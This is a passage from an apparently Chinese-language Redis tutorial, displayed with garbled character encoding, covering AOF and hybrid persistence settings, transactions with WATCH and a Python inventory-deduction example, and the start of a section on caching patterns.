<p><code>Redis</code>æ‰§è¡Œå®Œä¸€ä¸ªå†™å‘½ä»¤åï¼Œä¼šå°†è¯¥å‘½ä»¤æŒ‰ç…§åè®®è¿½åŠ åˆ°å†…å­˜ä¸­çš„AOFç¼“å†²åŒºï¼Œé¿å…ç›´æ¥å†™å…¥ç£ç›˜ï¼Œå‡å°‘IOå¼€é”€</p>
</li>
<li>
<p>æ–‡ä»¶å†™å…¥</p>
<p><code>Redis</code>ä¼šå®šæœŸå°†AOFç¼“å†²åŒºçš„æ•°æ®å†™å…¥åˆ°å†…æ ¸é¡µç¼“å­˜ï¼Œè¿™ä¸ªæ“ä½œæ˜¯è°ƒç”¨æ“ä½œç³»ç»Ÿçš„writeæ–¹æ³•ï¼Œå±äºå¼‚æ­¥æ“ä½œï¼Œä¸ä¼šé˜»å¡ä¸»çº¿ç¨‹ã€‚</p>
</li>
<li>
<p>æ–‡ä»¶åŒæ­¥</p>
<p>å°†å†…æ ¸é¡µç¼“å­˜ä¸­çš„AOFæ•°æ®å†™åˆ°æµ‹ç›˜ä¸­ï¼Œè¿™ä¸ªæ˜¯è°ƒç”¨çš„æ“ä½œç³»ç»Ÿçš„åŒæ­¥æ–¹æ³•ï¼Œä¼šé˜»å¡ä¸»çº¿ç¨‹çš„ï¼Œç›´åˆ°åˆ·ç›˜å®Œæˆã€‚</p>
<p>å°†AOFç¼“å†²åŒºä¸­çš„å‘½ä»¤åˆ·åˆ°ç£ç›˜çš„AOFæ–‡ä»¶ä¸­ï¼Œæœ‰ä¸‰ç§ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># appendfsync æœ‰ä¸‰ä¸ªå–å€¼ï¼š</span>
appendfsync always  <span class="hljs-comment"># æ¯æ¬¡å†™å‘½ä»¤éƒ½ç«‹å³åˆ·ç›˜ï¼ˆåŒæ­¥ï¼‰ï¼Œæ•°æ®æœ€å®‰å…¨ï¼Œæ€§èƒ½æœ€å·®</span>
appendfsync everysec<span class="hljs-comment"># æ¯ç§’åˆ·ç›˜ä¸€æ¬¡ï¼ˆé»˜è®¤å€¼ï¼‰ï¼Œå¹³è¡¡æ•°æ®å®‰å…¨å’Œæ€§èƒ½</span>
appendfsync <span class="hljs-keyword">no</span> Â  Â   <span class="hljs-comment"># ç”±æ“ä½œç³»ç»Ÿå†³å®šä½•æ—¶åˆ·ç›˜ï¼Œæ€§èƒ½æœ€å¥½ï¼Œæ•°æ®ä¸¢å¤±é£é™©æœ€é«˜</span>
</code></pre>
</li>
</ol>
<p>ç”±äºAOFæ˜¯æ—¥å¿—è¿½åŠ çš„å½¢å¼ï¼Œä¼šäº§ç”Ÿå¤§é‡çš„ä¸­é—´æ€ï¼Œæ¯”å¦‚<code>set key 1</code> â†’ <code>set key 2</code> â†’ <code>set key 3</code> ï¼Œè¿™ç§ä¸­é—´æ€å…¶å®æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œè¿˜ä¼šå¯¼è‡´AOFæ–‡ä»¶å˜å¾—å¾ˆå¤§ï¼Œè¿™å°±éœ€è¦AOFé‡å†™æœºåˆ¶äº†ï¼Œé‡å†™å°±æ˜¯éå†å†…å­˜ä¸­çš„æ‰€æœ‰çš„æ•°æ®ï¼Œæ ¹æ®å½“å‰çš„é”®å€¼å¯¹ç”Ÿæˆä¸€å¥—æœ€ç®€çš„å†™å‘½ä»¤é›†æ¥æ›¿æ¢åŸæœ‰çš„AOFæ–‡ä»¶ï¼Œé‡å†™çš„è§¦å‘ä¹Ÿåˆ†ä¸ºæ‰‹åŠ¨è§¦å‘å’Œè‡ªåŠ¨è§¦å‘ï¼šæ‰‹åŠ¨è§¦å‘éœ€è¦æ‰§è¡Œ<code>bgrewriteaof</code>å‘½ä»¤ï¼›è‡ªåŠ¨è§¦å‘æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶ï¼Œå½“æ–‡ä»¶çš„ä½“ç§¯å¢é•¿åˆ°è¾¾é˜™å€¼æ—¶ï¼Œè‡ªåŠ¨è§¦å‘<code>`bgrewriteaof</code>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">auto</span>-aof-rewrite-min-size <span class="hljs-number">64</span>mb  # AOFæ–‡ä»¶çš„æœ€å°ä½“ç§¯ï¼Œä½äºè¿™ä¸ªå€¼ä¸è§¦å‘é‡å†™ï¼ˆé»˜è®¤<span class="hljs-number">64</span>mbï¼‰
<span class="hljs-keyword">auto</span>-aof-rewrite-percentage <span class="hljs-number">100</span> # é‡å†™è§¦å‘çš„ç™¾åˆ†æ¯”ï¼ŒæŒ‡å½“å‰AOFæ–‡ä»¶ä½“ç§¯æ¯”ä¸Šä¸€æ¬¡é‡å†™åçš„ä½“ç§¯å¢é•¿äº†å¤šå°‘ï¼ˆé»˜è®¤<span class="hljs-number">100</span>%ï¼‰
</code></pre>
<p>AOFçš„ä¼˜ç‚¹å°±æ˜¯ï¼Œå¯ä»¥é€šè¿‡åˆ·ç›˜ç­–ç•¥æ¥æ§åˆ¶æ•°æ®ä¸¢å¤±çš„é£é™©ï¼Œé»˜è®¤çš„<code>everysec</code>ä»…ä¸¢å¤±1sçš„æ•°æ®ï¼Œ<code>alway</code>å‡ ä¹æ— ä¸¢å¤±ï¼›ç¼ºç‚¹å°±æ˜¯AOFæ–‡ä»¶ä½“ç§¯è¾ƒå¤§ï¼Œæ¢å¤æ•°æ®æ—¶åŠ è½½è¾ƒæ…¢ã€‚</p>
<h6 data-id="heading-14">æ··åˆæŒä¹…åŒ–</h6>
<p>RDBå’ŒAOFå•ç‹¬ä½¿ç”¨éƒ½å„æœ‰ä¼˜ç¼ºç‚¹ï¼Œåœ¨<code>Redis 4.0</code>ä¹‹åï¼Œå¼•å…¥äº†æ··åˆæŒä¹…åŒ–æœºåˆ¶ï¼Œèåˆæ¶RDBå’ŒAOFçš„ä¼˜ç‚¹ï¼Œæˆä¸ºäº†ç›®å‰ç”Ÿäº§ç¯å¢ƒçš„é¦–é€‰æ–¹æ¡ˆã€‚</p>
<p>åœ¨<code>redis.conf</code>é…ç½®æ–‡ä»¶ä¸­å¼€å¯æ··åˆæŒä¹…åŒ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">aof-use-rdb-preamble <span class="hljs-built_in">yes</span>  <span class="hljs-comment"># å¼€å¯æ··åˆæŒä¹…åŒ–ï¼ˆRedis 4.0+ï¼Œé»˜è®¤noï¼›Redis 6.0+ éƒ¨åˆ†ç‰ˆæœ¬é»˜è®¤yesï¼‰</span>
</code></pre>
<p>å¼€å¯åï¼ŒAOFæ–‡ä»¶å°±ä¸å†æ˜¯çº¯æ–‡æœ¬äº†ï¼Œå¤´éƒ¨å°±æˆäº†RDBæ ¼å¼çš„å…¨é‡æ•°æ®å¿«ç…§ï¼Œä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°¾éƒ¨æ˜¯AOFæ ¼å¼å†™çš„å¢é‡å‘½ä»¤ï¼Œè®°å½•ä»ç”ŸæˆRDBå¿«ç…§åˆ°å½“å‰çš„æ‰€æœ‰å†™å‘½ä»¤ï¼Œæ˜¯çº¯æ–‡æœ¬ã€‚</p>
<p>å…¶å·¥ä½œæµç¨‹ä¸»è¦æœ‰è¿™ä¹ˆå‡ ä¸ªæ­¥éª¤ï¼š</p>
<p>å½“AOFè§¦å‘é‡å†™æ—¶ï¼Œ</p>
<ol start="0">
<li>redisä¸»è¿›ç¨‹è¿›å…¥forkå­è¿›ç¨‹ï¼Œæ‰§è¡ŒAOFé‡å†™</li>
<li>å­è¿›ç¨‹é¦–å…ˆå°†å†…å­˜ä¸­çš„å…¨é‡æ•°æ®ä»¥RDBæ ¼å¼å†™å…¥åˆ°ä¸´æ—¶çš„AOFæ–‡ä»¶å¤´éƒ¨</li>
<li>å­è¿›ç¨‹å®ŒæˆRDBå†™å…¥åï¼Œä¸»è¿›ç¨‹å°†AOFé‡å†™ç¼“å†²åŒºä¸­æ‰€æœ‰çš„å¢é‡å†™å‘½ä»¤ï¼Œä»¥AOFæ ¼å¼å†™å…¥åˆ°ä¸´æ—¶çš„AOFæ–‡ä»¶å°¾éƒ¨</li>
<li>ä¸»è¿›ç¨‹ç”¨ä¸´æ—¶AOFæ–‡ä»¶æ›¿æ¢æ‰æ—§çš„AOFæ–‡ä»¶ï¼Œå®Œæˆæ··åˆæŒä¹…åŒ–çš„é‡å†™ã€‚</li>
</ol>
<p>æ··åˆæŒä¹…åŒ–çš„ä¼˜ç‚¹å°±åœ¨äºåŠ è½½é€Ÿåº¦å¿«ï¼Œæ•°æ®ä¸¢å¤±é£é™©å°ï¼Œè€Œä¸”æ–‡ä»¶çš„ä½“ç§¯ä¹Ÿä¸ä¼šå¾ˆå¤§ã€‚</p>
<p>ä¸‹é¢æ¨èä¸€ä¸ªå¸¸è§çš„ç”Ÿäº§ç¯å¢ƒçš„é…ç½®ï¼Œå¼€å¯æ··åˆæŒä¹…åŒ–+RBDé»˜è®¤è‡ªåŠ¨å¿«ç…§ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ===================== RDB æ ¸å¿ƒé…ç½® =====================</span>
save 900 1
save 300 10
save 60 10000
rdbcompression <span class="hljs-built_in">yes</span>  <span class="hljs-comment"># å¼€å¯RDBå‹ç¼©</span>
dbfilename dump.rdb <span class="hljs-comment"># RDBæ–‡ä»¶å</span>
<span class="hljs-built_in">dir</span> ./ Â  Â  Â  Â  Â  Â   <span class="hljs-comment"># æŒä¹…åŒ–æ–‡ä»¶å­˜å‚¨ç›®å½•ï¼ˆå»ºè®®ä¿®æ”¹ä¸ºç‹¬ç«‹çš„ç£ç›˜ç›®å½•ï¼‰</span>
â€‹
<span class="hljs-comment"># ===================== AOF æ ¸å¿ƒé…ç½® =====================</span>
appendonly <span class="hljs-built_in">yes</span> Â  Â   <span class="hljs-comment"># å¼€å¯AOFï¼ˆæ··åˆæŒä¹…åŒ–çš„å‰æï¼‰</span>
appendfilename <span class="hljs-string">"appendonly.aof"</span> <span class="hljs-comment"># AOFæ–‡ä»¶å</span>
appendfsync everysec <span class="hljs-comment"># åˆ·ç›˜ç­–ç•¥ï¼Œç”Ÿäº§é¦–é€‰</span>
auto-aof-rewrite-min-size 64mb <span class="hljs-comment"># AOFé‡å†™æœ€å°ä½“ç§¯</span>
auto-aof-rewrite-percentage 100 <span class="hljs-comment"># AOFé‡å†™å¢é•¿ç™¾åˆ†æ¯”</span>
aof-use-rdb-preamble <span class="hljs-built_in">yes</span> <span class="hljs-comment"># å¼€å¯æ··åˆæŒä¹…åŒ–ï¼ˆRedis 4.0+ï¼‰</span>
aof-load-truncated <span class="hljs-built_in">yes</span> <span class="hljs-comment"># åŠ è½½AOFæ—¶ï¼Œè‹¥å°¾éƒ¨æŸååˆ™å¿½ç•¥ï¼Œç»§ç»­åŠ è½½ï¼ˆé»˜è®¤yesï¼‰</span>
</code></pre>
<h4 data-id="heading-15">6. redisäº‹åŠ¡</h4>
<p><code>Redis</code>äº‹åŠ¡å°±æ˜¯æä¾›ä¸€ç§æœºåˆ¶ï¼Œå°†å¤šä¸ª<code>Redis</code>å‘½ä»¤æ‰“åŒ…æˆä¸€ä¸ªæ‰§è¡Œå•å…ƒï¼Œä¿è¯è¿™ä¸ªå•å…ƒå†…çš„å‘½ä»¤ä¼šæŒ‰ç…§é¡ºåºã€æ— ä¸­æ–­çš„æ‰§è¡Œï¼ŒåŒæ—¶æ”¯æŒå¯¹å‘½ä»¤æ‰§è¡Œç»“æœçš„ç»Ÿä¸€å¤„ç†ï¼Œè§£å†³å¤šå‘½ä»¤æ‰¹é‡æ‰§è¡Œçš„åŸå­æ€§éœ€æ±‚ã€‚</p>
<p><code>Redis</code>äº‹åŠ¡åªä¾èµ–äº”ä¸ªå‘½ä»¤ï¼š</p>
<ol start="0">
<li>MULTI æ ‡è®°äº‹åŠ¡å¼€å§‹ï¼Œåç»­æ‰€æœ‰çš„å‘½ä»¤éƒ½ä¼šåŠ å…¥åˆ°äº‹åŠ¡é˜Ÿåˆ—ä¸­</li>
<li>EXEC æ‰§è¡Œäº‹åŠ¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰å‘½ä»¤ï¼Œæ‰§è¡Œå®Œæˆåç»“æŸäº‹åŠ¡ï¼Œè¿”å›æ‰€æœ‰å‘½ä»¤çš„æ‰§è¡Œç»“æœ</li>
<li>DISCARD æ”¾å¼ƒäº‹åŠ¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰å‘½ä»¤ï¼Œæ¸…ç©ºé˜Ÿåˆ—ç»“æŸäº‹åŠ¡ï¼Œå›åˆ°æ­£å¸¸çš„æ‰§è¡Œæ¨¡å¼</li>
<li>WATCH KEY å¯¹keyåŠ ä¹è§‚é”ï¼Œç›‘æ§keyæ˜¯å¦ä¿®æ”¹ï¼Œå¿…é¡»åœ¨<code>MULTI</code>ä¹‹å‰ä¿®æ”¹</li>
<li>UNWATCH å–æ¶ˆæ‰€æœ‰è¢«watchç›‘æ§çš„keyï¼Œäº‹åŠ¡å–æ¶ˆæˆ–è€…æ‰§è¡Œåä¼šè‡ªåŠ¨æ‰§è¡Œ</li>
</ol>
<p>çœ‹ä¸‹è¿™ä¸ªæœ€åŸºç¡€çš„å®åŠ¡æµç¨‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">MULTI
<span class="hljs-keyword">SET</span> balance <span class="hljs-number">100</span>
INCR balance
<span class="hljs-keyword">EXEC</span>
</code></pre>
<p>æ‰§è¡Œåˆ°<code>MULTI</code>æ—¶ï¼Œä¼šè¿›å…¥äº‹åŠ¡çŠ¶æ€ï¼Œåç»­çš„<code>SET</code>ã€<code>INCR</code>ä¼šè¢«æ”¾å…¥åˆ°ä¸€ä¸ªäº‹åŠ¡é˜Ÿåˆ—ä¸­ï¼Œç›´è¡Œåˆ°<code>EXEC</code>æ—¶æ‰ä¼šæ‰§è¡Œé˜Ÿåˆ—ä¸­çš„æ‰€æœ‰çš„å‘½ä»¤ã€‚</p>
<p>ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“äº‹åŠ¡ä¸¥æ ¼éµå¾ª<code>ACID</code>åŸåˆ™ï¼ŒåŸå­æ€§ã€ä¸€è‡´æ€§ã€éš”ç¦»æ€§å’ŒæŒä¹…æ€§ï¼Œä½†æ˜¯<code>Redis</code>äº‹åŠ¡ä¸ºäº†æè‡´çš„æ€§èƒ½ï¼Œå¹¶ä¸æ˜¯å®Œå…¨éµå¾ªACIDåŸåˆ™ã€‚æ¥ä¸‹æ¥ä»‹ç»ä¸‹ä»–çš„åŒºåˆ«ï¼š</p>
<ol start="0">
<li>
<p>åŸå­æ€§</p>
<p>åŸå­æ€§çš„å®šä¹‰å°±æ˜¯äº‹åŠ¡ä¸­çš„æ‰€æœ‰çš„æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆå…¨éƒ¨ä¸æ‰§è¡Œï¼Œä¸ä¼šå‡ºç°éƒ¨åˆ†æ‰§è¡Œçš„æƒ…å†µï¼Œè€Œ<code>Redis</code>äº‹åŠ¡çš„åŸå­æ€§åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š</p>
<p>1ï¼‰ äº‹åŠ¡å…¥é˜Ÿå‰å‡ºé”™ï¼Œå…¨ä¸æ‰§è¡Œï¼šå½“åœ¨MULTIåï¼ŒEXECå‰å‡ºç°è¯­æ³•é”™è¯¯ï¼Œ<code>Redis</code>ä¼šç«‹å³è¿”å›é”™è¯¯ï¼Œæ‰§è¡ŒEXECæ—¶ä¼šç›´æ¥æ”¾å¼ƒæ•´ä¸ªäº‹åŠ¡</p>
<p>2ï¼‰ æ‰§è¡Œäº‹åŠ¡ä¸­å‡ºç°é”™è¯¯ï¼Œéƒ¨åˆ†æ‰§è¡Œï¼Œæ²¡æœ‰å›æ»šï¼Œå‘½ä»¤å…¥é˜Ÿæ—¶åªä¼šåšè¯­æ³•æ£€æŸ¥ï¼Œä¸ä¼šåšé€»è¾‘æ£€æŸ¥ï¼Œæ‰§è¡Œæ—¶å¦‚æœå‡ºç°äº†è¿è¡Œé”™è¯¯ï¼Œ<code>Redis</code>å°±ä¼šè·³è¿‡è¿™ä¸ªå‘½ä»¤ï¼Œç»§ç»­æ‰§è¡Œåç»­çš„å‘½ä»¤ï¼Œè€Œä¸”ä¸ä¼šå¯¹å·²ç»æ‰§è¡Œçš„å‘½ä»¤åšå›æ»š</p>
<p>ä¸æ”¯æŒå›æ»šä¸»è¦ä¹Ÿæ˜¯ä»æ€§èƒ½è€ƒé‡ï¼Œå®ç°å›æ»šéœ€è¦è®°å½•æ¯ä¸ªå‘½ä»¤çš„é€†æ“ä½œï¼Œæ¯”å¦‚SETçš„æ“ä½œå°±æ˜¯æ¢å¤åŸå€¼ï¼Œè¿™ä¸ªä¼šå¢åŠ <code>Redis</code>å†…æ ¸çš„å¤æ‚åº¦ï¼Œç‰ºç‰²æ‰§è¡Œçš„æ€§èƒ½ã€‚</p>
</li>
<li>
<p>ä¸€è‡´æ€§</p>
<p>ä¸€è‡´æ€§å°±æ˜¯äº‹åŠ¡æ‰§è¡Œçš„å‰åï¼Œæ•°æ®åº“çš„çŠ¶æ€å§‹ç»ˆä¿æŒåˆæ³•ï¼Œä¸ä¼šå› ä¸ºäº‹åŠ¡çš„æ‰§è¡Œè€Œå‡ºç°è„æ•°æ®ã€‚<code>Redis</code>äº‹åŠ¡å¯ä»¥åœ¨æ‰€æœ‰çš„å¼‚å¸¸æƒ…å†µä¸‹ï¼Œæ¯”å¦‚å…¥é˜Ÿé”™è¯¯ã€æ‰§è¡Œé”™è¯¯ã€å®•æœºï¼Œéƒ½å¯ä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚</p>
</li>
<li>
<p>éš”ç¦»æ€§</p>
<p>éš”ç¦»å°±æ˜¯åœ¨å¤šä¸ªäº‹åŠ¡å¹¶å‘æ‰§è¡Œæ—¶ï¼Œä¸€ä¸ªäº‹åŠ¡çš„æ‰§è¡Œä¸ä¼šè¢«å…¶ä»–çš„äº‹åŠ¡å¹²æ‰°ï¼Œå„ä¸ªäº‹åŠ¡ä¹‹é—´ç›¸äº’éš”ç¦»ã€‚<code>Redis</code>æ˜¯å•çº¿ç¨‹å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„ï¼Œè¿™å°±ä¼šå¯¼è‡´äº‹åŠ¡çš„æ‰§è¡Œä¼šæŒ‰ç…§é˜Ÿåˆ—ä¸­çš„é¡ºåºè¿ç»­æ‰§è¡Œï¼Œä¸ä¼šè¢«å…¶ä»–çš„å‘½ä»¤æ‰“æ–­</p>
</li>
<li>
<p>æŒä¹…æ€§</p>
<p>æŒä¹…æ€§æ˜¯æŒ‡äº‹åŠ¡æ‰§è¡ŒæˆåŠŸåï¼Œå¯¹æ•°æ®çš„ä¿®æ”¹ä¼šè¢«æ°¸ä¹…çš„ä¿å­˜åˆ°ç£ç›˜ä¸­ï¼Œä¸ä¼šåº”ä¸ºå®•æœºè€Œä¸¢å¤±ã€‚<code>Redis</code>äº‹åŠ¡æœ¬èº«å¹¶ä¸ä¿è¯æŒä¹…æ€§ï¼ŒæŒä¹…æ€§æ˜¯ç”±<code>Redis</code>çš„æŒä¹…åŒ–æœºåˆ¶æ¥å®ç°çš„ï¼Œå‰é¢ä¹Ÿä»‹ç»è¿‡</p>
</li>
</ol>
<p>æ¥ä¸‹æ¥å†™ä¸€ä¸ªå°çš„demoï¼Œåˆ©ç”¨watchæ¥æ§åˆ¶åº“å­˜é˜²æ­¢è¶…å–</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_purchase</span>(<span class="hljs-params">stock_key: <span class="hljs-built_in">str</span>, user: <span class="hljs-built_in">str</span>, qty: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
 Â  Â <span class="hljs-string">"""ä½¿ç”¨ WATCH + äº‹åŠ¡è¿›è¡Œæ‰£åº“å­˜ï¼Œé¿å…è¶…å–ã€‚
â€‹
 Â   ä¹è§‚é”æ€è·¯ï¼š
 Â   1. WATCH åº“å­˜ keyï¼Œç›‘å¬æ˜¯å¦è¢«åˆ«äººæ”¹åŠ¨ï¼›
 Â   2. è¯»å½“å‰åº“å­˜ï¼Œåˆ¤æ–­æ˜¯å¦è¶³å¤Ÿï¼›
 Â   3. ä½¿ç”¨ MULTI å¼€å¯äº‹åŠ¡ï¼Œæ‰£å‡åº“å­˜ï¼›
 Â   4. EXEC æäº¤ï¼Œå¦‚æœåœ¨è¿™æœŸé—´åº“å­˜è¢«åˆ«äººæ”¹äº†ï¼ŒEXEC ä¼šå¤±è´¥ï¼ˆæŠ› WatchErrorï¼‰ï¼Œç„¶åé‡è¯•ã€‚
 Â   """</span>
â€‹
 Â  Â <span class="hljs-keyword">with</span> r.pipeline() <span class="hljs-keyword">as</span> pipe:
 Â  Â  Â  Â <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">try</span>:
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># 1. ç›‘å¬åº“å­˜ key</span>
 Â  Â  Â  Â  Â  Â  Â  Â pipe.watch(stock_key)
â€‹
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># 2. è¯»å–å½“å‰åº“å­˜</span>
 Â  Â  Â  Â  Â  Â  Â  Â current = pipe.get(stock_key)
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">if</span> current <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: å•†å“ä¸å­˜åœ¨"</span>)
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â pipe.unwatch()
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
â€‹
 Â  Â  Â  Â  Â  Â  Â  Â current = <span class="hljs-built_in">int</span>(current)
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">if</span> current &lt; qty:
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: åº“å­˜ä¸è¶³ï¼Œå½“å‰åº“å­˜=<span class="hljs-subst">{current}</span>"</span>)
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â pipe.unwatch()
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
â€‹
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># 3. å¼€å¯äº‹åŠ¡ï¼Œæ‰£å‡åº“å­˜</span>
 Â  Â  Â  Â  Â  Â  Â  Â pipe.multi()
 Â  Â  Â  Â  Â  Â  Â  Â pipe.decrby(stock_key, qty)
â€‹
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># 4. æäº¤äº‹åŠ¡</span>
 Â  Â  Â  Â  Â  Â  Â  Â pipe.execute()
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: æŠ¢è´­æˆåŠŸï¼Œæ‰£å‡ <span class="hljs-subst">{qty}</span>ï¼Œæ‰£å‡å‰åº“å­˜=<span class="hljs-subst">{current}</span>"</span>)
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
â€‹
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">except</span> redis.WatchError:
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># åœ¨ WATCH ä¹‹åã€EXEC ä¹‹å‰ï¼Œæœ‰å…¶ä»–å®¢æˆ·ç«¯ä¿®æ”¹äº† stock_keyï¼Œ</span>
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># è¿™æ¬¡äº‹åŠ¡ä¼šå¤±è´¥ï¼Œéœ€è¦é‡è¯•ã€‚</span>
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: æ£€æµ‹åˆ°å¹¶å‘å†²çªï¼Œé‡è¯•ä¸­..."</span>)
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">continue</span>
</code></pre>
<h2 data-id="heading-16">ç¬¬ä¸‰é˜¶æ®µï¼šé«˜å¹¶å‘&amp;åˆ†å¸ƒå¼</h2>
<h4 data-id="heading-17">7. ç¼“å­˜æ¨¡å¼ä¸ä¸€è‡´æ€§</h4>
<p><code>Redis</code>ä½œä¸ºç¼“å­˜çš„æ ¸å¿ƒäº®ç‚¹å°±åœ¨äºå…¶é«˜é€Ÿçš„è¯»å†™æ“ä½œï¼Œæ¥é™ä½ä¼ ç»Ÿæ•°æ®åº“çš„å‹åŠ›ï¼ŒåŸºäºæ­¤<code>Redis</code>æ¨å‡ºäº†æœ‰å¤§æ¦‚å››ç§ä¸»æµçš„ç¼“å­˜ç­–ç•¥ï¼Œæ¥å°†ç¼“å­˜èå…¥ä¸šåŠ¡è¯»å†™æµç¨‹ï¼ŒåŒæ—¶ä¿è¯ç¼“å­˜ä¸æ•°æ®åº“çš„ä¸€è‡´æ€§ã€‚æ¥ä¸‹æ¥æŒ¨ä¸ªä»‹ç»ä¸‹ï¼š</p>
<ol start="0">
<li>
<p>ç¼“å­˜ç©¿é€æ¨¡å¼</p>
<p>ç¼“å­˜å’Œæ•°æ®åº“åˆ†ç¦»ï¼Œä¸šåŠ¡ä»£ç ä¸»åŠ¨ç®¡ç†ç¼“å­˜å’Œæ•°æ®åº“çš„äº¤äº’ã€‚åœ¨è¯»æ“ä½œæ—¶ï¼Œå…ˆæŸ¥è¯¢ç¼“å­˜ï¼Œå¦‚æœå‘½ä¸­å°±ç›´æ¥è¿”å›ï¼Œå¦‚æœæ²¡æœ‰å°±æŸ¥è¯¢æ•°æ®åº“ï¼ŒåŒæ—¶å°†æ•°æ®åº“çš„ç»“æœå†™å…¥ç¼“å­˜ï¼›åœ¨å†™æ“ä½œæ—¶ï¼Œå…ˆæ›´æ–°æ•°æ®åº“ï¼Œåœ¨åˆ é™¤ç¼“å­˜ã€‚</p>
<p>è¿™ç§æ¨¡å¼é€‚åˆç»å¤§å¤šæ•°çš„ç”Ÿäº§åœºæ™¯ï¼Œæ˜¯<code>Redis</code>ä½œä¸ºç¼“å­˜çš„é¦–é€‰æ¨¡å¼ã€‚ä¼˜ç‚¹å°±æ˜¯ç®€å•æ˜“å®ç°ï¼Œç¼ºç‚¹å°±æ˜¯éœ€è¦é¢å¤–å¤„ç†ç¼“å­˜ç©¿é€ã€å‡»ç©¿é›ªå´©ç­‰åœºæ™¯ã€‚</p>
</li>
<li>
<p>è¯»å†™ç©¿é€</p>
<p>ä¸šåŠ¡ä»£ç åªå’Œç¼“å­˜äº¤äº’ï¼Œä¸ç›´æ¥æ“ä½œæ•°æ®åº“ï¼Œç¼“å­˜ä½œä¸ºä¸­é—´å±‚ï¼Œä¸»åŠ¨ç®¡ç†æ•°æ®åº“çš„è¯»å†™ã€‚åœ¨è¯»æ“ä½œæ—¶ï¼Œå…ˆæŸ¥è¯¢ç¼“å­˜ï¼Œå¦‚æœå‘½ä¸­å°±ç›´æ¥è¿”å›ï¼Œæœªå‘½ä¸­å°±æŸ¥è¯¢æ•°æ®åº“ï¼Œå°†ç»“æœå†™å…¥ç¼“å­˜ï¼Œç„¶åè¿”å›ï¼›å†™æ“ä½œå°±æ›´æ–°ç¼“å­˜ï¼Œç„¶åå†å»æ›´æ–°æ•°æ®åº“ã€‚</p>
<p>è¿™ç§æ¨¡å¼çš„ç‰¹ç‚¹å°±æ˜¯ä¸šåŠ¡ä»£ç åªä¸“æ³¨äºä¸šåŠ¡ï¼Œæ•°æ®åº“ç”±ç¼“å­˜å±‚æ¥å¤„ç†ï¼Œç®€åŒ–äº†ä¸šåŠ¡ä»£ç é€»è¾‘ï¼Œç¼ºç‚¹å°±æ˜¯ç¼“å­˜å±‚éœ€è¦é¢å¤–çš„ä»£ç å¼€å‘ï¼Œè€Œä¸”ä¸æ”¯æŒæ–°å¢æ•°æ®ï¼Œå› ä¸ºæ–°å¢æ•°æ®è¦å…ˆæ‰§è¡Œè¯»æ“ä½œï¼Œæ‰èƒ½å­˜å…¥ç¼“å­˜ï¼Œä¸å¤ªç¬¦åˆå¸¸è§„çš„ä¸šåŠ¡é€»è¾‘ã€‚</p>
</li>
<li>
<p>å†™ç©¿æ¨¡å¼</p>
<p>è¿™ç§æ¨¡å¼æ˜¯è¯»å†™ç©¿æ¨¡å¼çš„å¢å¼ºç‰ˆï¼Œæ”¯æŒæ–°å¢ã€æ›´æ–°æ•°æ®ã€‚åœ¨è¯»æ“ä½œæ—¶ï¼Œå’Œè¯»å†™ç©¿é€æ¨¡å¼ä¸€æ ·ï¼Œå‘½ä¸­è¿”å›ï¼Œæœªå‘½ä¸­æŸ¥åº“æ›´æ–°ç¼“å­˜ï¼›å†™æ“ä½œæ—¶å’Œæ–°å¢æ•°æ®æ—¶ï¼Œç¼“å­˜åŒæ­¥æ›´æ–°æ•°æ®åº“ï¼Œç„¶åè¿”å›ç»™ä¸šåŠ¡ã€‚</p>
